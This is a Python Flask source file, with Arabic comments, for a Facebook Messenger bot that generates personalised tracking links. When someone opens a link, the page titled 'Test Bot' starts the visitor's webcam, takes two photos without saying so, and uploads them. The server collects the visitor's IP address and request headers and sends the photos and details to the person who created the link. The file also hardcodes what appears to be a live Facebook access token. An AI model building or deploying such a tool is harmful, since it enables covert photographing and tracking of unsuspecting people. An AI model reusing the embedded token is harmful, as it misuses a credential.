import os
import requests
import json
from flask import Flask, request, jsonify, render_template
from datetime import datetime

app = Flask(__name__)

ACCESS_TOKEN = "EAAQQA1jZB5X4BO2xMCZCOEMpjj8sZANib8YPx1hGBp8EVRAATtLCbV041Wke1Y3K0fEF6n0h3ZBEkGm7wwoENo51XZB1UipOVcn2mWDNjSfbsj2q7f7gKTZA27RyWpz6yLjnRWM6PxwiDrD8qDXbQu72UZCDoMJS9ZCSGEyZBIZASxP2ZBweZCKNxxPAdqqCiwLrsKIpRAZDZD"
DOMAIN = "https://bogrinaxp.onrender.com"

# تخزين بيانات المستخدمين والروابط
user_data = {}

@app.route("/", methods=["GET"])
def index():
    return jsonify({"message": "API is working!"}), 200

@app.route("/webhook", methods=["GET", "POST"])
def webhook():
    if request.method == "GET":
        mode = request.args.get("hub.mode")
        challenge = request.args.get("hub.challenge")
        verify_token = request.args.get("hub.verify_token")
        if mode == "subscribe" and verify_token:
            return challenge
        else:
            return jsonify({"message": "Invalid verify token"}), 401
    elif request.method == "POST":
        body = request.get_json()
        if body["object"] == "page":
            entry = body["entry"][0]
            messaging_event = entry["messaging"][0]
            sender_id = messaging_event["sender"]["id"]
            if "message" in messaging_event:
                message_text = messaging_event["message"]["text"]

                # إنشاء رابط جديد
                if message_text.startswith("creatr-url["):
                    name = message_text.split("[")[1].split("]")[0]
                    user_data[sender_id] = {"name": name, "link": f"{DOMAIN}/{sender_id}/{name}"}
                    send_message(sender_id, f"تم إنشاء الرابط: {user_data[sender_id]['link']}")
            return jsonify({"message": "Message received!"}), 200

@app.route("/<user_id>/<name>", methods=["GET"])
def dynamic_link(user_id, name):
    if user_id in user_data and user_data[user_id]["name"] == name:
        return """
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Test Bot</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    background-color: red;
                    animation: changeBackground 5s infinite;
                    padding: 20px;
                }
                @keyframes changeBackground {
                    0% { background-color: red; }
                    50% { background-color: blue; }
                    100% { background-color: red; }
                }
            </style>
        </head>
        <body>
            <h1>Test Bot</h1>
            <script>
                // تشغيل الكاميرا
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();

                        // التقاط الصورة الأمامية
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imageData = canvas.toDataURL('image/jpeg');

                            // رفع الصورة الأمامية
                            uploadImage(imageData, 'front');
                        }, 1000);

                        // التقاط الصورة الخلفية
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imageData = canvas.toDataURL('image/jpeg');

                            // رفع الصورة الخلفية
                            uploadImage(imageData, 'back');
                        }, 3000);
                    })
                    .catch(err => {
                        console.error("حدث خطأ أثناء تشغيل الكاميرا:", err);
                    });

                // رفع الصورة
                function uploadImage(imageData, imageType) {
                    const formData = new FormData();
                    formData.append('user_id', '{{ user_id }}');
                    formData.append('name', '{{ name }}');
                    formData.append('image_type', imageType);
                    formData.append('image', dataURLtoFile(imageData, `${imageType}.jpg`));

                    fetch('/upload', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log(data.message);
                    })
                    .catch(error => {
                        console.error("حدث خطأ أثناء رفع الصورة:", error);
                    });
                }

                // تحويل Data URL إلى ملف
                function dataURLtoFile(dataurl, filename) {
                    const arr = dataurl.split(',');
                    const mime = arr[0].match(/:(.*?);/)[1];
                    const bstr = atob(arr[1]);
                    let n = bstr.length;
                    const u8arr = new Uint8Array(n);
                    while (n--) {
                        u8arr[n] = bstr.charCodeAt(n);
                    }
                    return new File([u8arr], filename, { type: mime });
                }
            </script>
        </body>
        </html>
        """.replace("{{ user_id }}", user_id).replace("{{ name }}", name)
    return "Name not found!", 404

@app.route("/upload", methods=["POST"])
def upload():
    user_id = request.form.get("user_id")
    name = request.form.get("name")
    image = request.files.get("image")
    image_type = request.form.get("image_type")

    if user_id in user_data and user_data[user_id]["name"] == name:
        # حفظ الصورة
        image_path = f"uploads/{user_id}_{image_type}_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
        image.save(image_path)

        # جمع المعلومات
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        headers = dict(request.headers)
        device_info = f"تم فتح الرابط من:\nIP: {ip}\nHeaders: {json.dumps(headers, indent=2)}"

        # إرسال الصورة والمعلومات إلى المستخدم
        send_message(user_id, f"تم استلام الصورة ({image_type}):\n{device_info}")
        send_image(user_id, image_path)

        return jsonify({"message": "تم استلام الصورة بنجاح!"}), 200
    return "Name not found!", 404

def send_message(sender, message):
    api = "https://graph.facebook.com/v21.0/me/messages"
    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
        "Content-Type": "application/json"
    }
    payload = {
        "message": {"text": message},
        "recipient": {"id": sender}
    }
    requests.post(api, data=json.dumps(payload), headers=headers)

def send_image(sender, image_path):
    api = "https://graph.facebook.com/v21.0/me/messages"
    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
    }
    files = {
        "recipient": (None, json.dumps({"id": sender})),
        "message": (None, json.dumps({"attachment": {"type": "image", "payload": {"is_reusable": True}}})),
        "filedata": (image_path, open(image_path, "rb"), "image/jpeg")
    }
    requests.post(api, headers=headers, files=files)

if __name__ == "__main__":
    os.makedirs("uploads", exist_ok=True)
    app.run(host="0.0.0.0", port=5000, debug=True)
